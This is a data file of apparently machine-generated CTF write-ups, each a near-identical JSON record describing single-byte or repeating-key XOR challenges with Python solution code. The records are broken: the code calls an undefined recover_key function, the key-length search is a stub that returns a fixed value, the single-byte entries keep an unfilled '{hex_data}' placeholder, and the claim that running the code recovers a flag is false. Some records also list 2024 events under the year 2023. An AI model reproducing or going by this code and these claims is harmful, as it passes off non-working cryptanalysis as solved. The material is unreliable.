{"id": "synthetic_xor_004", "team": "synthetic_team_5", "event": "CTF_2024_Event_8", "challenge_name": "Multi-byte XOR Key Reuse #5", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"580f69b1b1dd95d39bebf6e8e01b7a74be932ca8e680725f534502f3cfa5ed4e\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"580f69b1b1dd95d39bebf6e8e01b7a74be932ca8e680725f534502f3cfa5ed4e\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/4", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827868", "synthetic": true}
{"id": "synthetic_xor_005", "team": "synthetic_team_5", "event": "CTF_2024_Event_4", "challenge_name": "Multi-byte XOR Key Reuse #6", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"9010780585c5759130fb65aa9b233e79d215604ca3816cad62ace6f4c8030ee0\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"9010780585c5759130fb65aa9b233e79d215604ca3816cad62ace6f4c8030ee0\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/5", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827911", "synthetic": true}
{"id": "synthetic_xor_006", "team": "synthetic_team_1", "event": "CTF_2024_Event_1", "challenge_name": "Single Byte XOR #7", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/6", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827958", "synthetic": true}
{"id": "synthetic_xor_007", "team": "synthetic_team_8", "event": "CTF_2024_Event_8", "challenge_name": "Multi-byte XOR Key Reuse #8", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"0af9942bc38671ee3407796c1a03acab3a032c583a4df3716e380c44b593fb57\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"0af9942bc38671ee3407796c1a03acab3a032c583a4df3716e380c44b593fb57\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/7", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828003", "synthetic": true}
{"id": "synthetic_xor_008", "team": "synthetic_team_5", "event": "CTF_2024_Event_8", "challenge_name": "Multi-byte XOR Key Reuse #9", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"ca7971715819df78dcea7dcfc3318ca913311a27d5af2f23ecbc4a9f61d512a1\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"ca7971715819df78dcea7dcfc3318ca913311a27d5af2f23ecbc4a9f61d512a1\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/8", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828048", "synthetic": true}
{"id": "synthetic_xor_009", "team": "synthetic_team_3", "event": "CTF_2024_Event_19", "challenge_name": "Single Byte XOR #10", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/9", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828093", "synthetic": true}
{"id": "synthetic_xor_010", "team": "synthetic_team_3", "event": "CTF_2024_Event_11", "challenge_name": "Multi-byte XOR Key Reuse #11", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"c81ad207652e0327c6bb21c7a7f1a6d5336268068c9a99a462c4366848b03a38\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"c81ad207652e0327c6bb21c7a7f1a6d5336268068c9a99a462c4366848b03a38\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/10", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828136", "synthetic": true}
{"id": "synthetic_xor_011", "team": "synthetic_team_8", "event": "CTF_2024_Event_10", "challenge_name": "Multi-byte XOR Key Reuse #12", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"d859a190b4bab25f1f00430f13575de9b697b7fffc2e5d86b3ebb1e859663115\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"d859a190b4bab25f1f00430f13575de9b697b7fffc2e5d86b3ebb1e859663115\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/11", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828180", "synthetic": true}
{"id": "synthetic_xor_012", "team": "synthetic_team_10", "event": "CTF_2024_Event_5", "challenge_name": "Multi-byte XOR Key Reuse #13", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"f7d32c7b7401196bff1710c78c3ba11450f824ab0c27ef7b784423fb768f82c9\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"f7d32c7b7401196bff1710c78c3ba11450f824ab0c27ef7b784423fb768f82c9\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/12", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828220", "synthetic": true}
{"id": "synthetic_xor_013", "team": "synthetic_team_1", "event": "CTF_2024_Event_19", "challenge_name": "Single Byte XOR #14", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/13", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828274", "synthetic": true}
{"id": "synthetic_xor_014", "team": "synthetic_team_6", "event": "CTF_2024_Event_13", "challenge_name": "Multi-byte XOR Key Reuse #15", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"66b830330784376fecf58666ce5e4dfe6cbcea762816f91d29ad031b650ae565\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"66b830330784376fecf58666ce5e4dfe6cbcea762816f91d29ad031b650ae565\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/14", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828320", "synthetic": true}
{"id": "synthetic_xor_015", "team": "synthetic_team_4", "event": "CTF_2024_Event_17", "challenge_name": "Multi-byte XOR Key Reuse #16", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"3b27a6ff83533ddac38d0302d1877d09dfec81c9a0c2dab1ec2fb47db03691bd\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"3b27a6ff83533ddac38d0302d1877d09dfec81c9a0c2dab1ec2fb47db03691bd\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/15", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828374", "synthetic": true}
{"id": "synthetic_xor_016", "team": "synthetic_team_10", "event": "CTF_2024_Event_16", "challenge_name": "Single Byte XOR #17", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/16", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828414", "synthetic": true}
{"id": "synthetic_xor_017", "team": "synthetic_team_5", "event": "CTF_2024_Event_9", "challenge_name": "Single Byte XOR #18", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/17", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828450", "synthetic": true}
{"id": "synthetic_xor_018", "team": "synthetic_team_10", "event": "CTF_2024_Event_3", "challenge_name": "Multi-byte XOR Key Reuse #19", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"c0204e2ea5f6d510c241e568df6d74696773f5fef9dc94bb25db8122958c5532\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"c0204e2ea5f6d510c241e568df6d74696773f5fef9dc94bb25db8122958c5532\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/18", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828483", "synthetic": true}
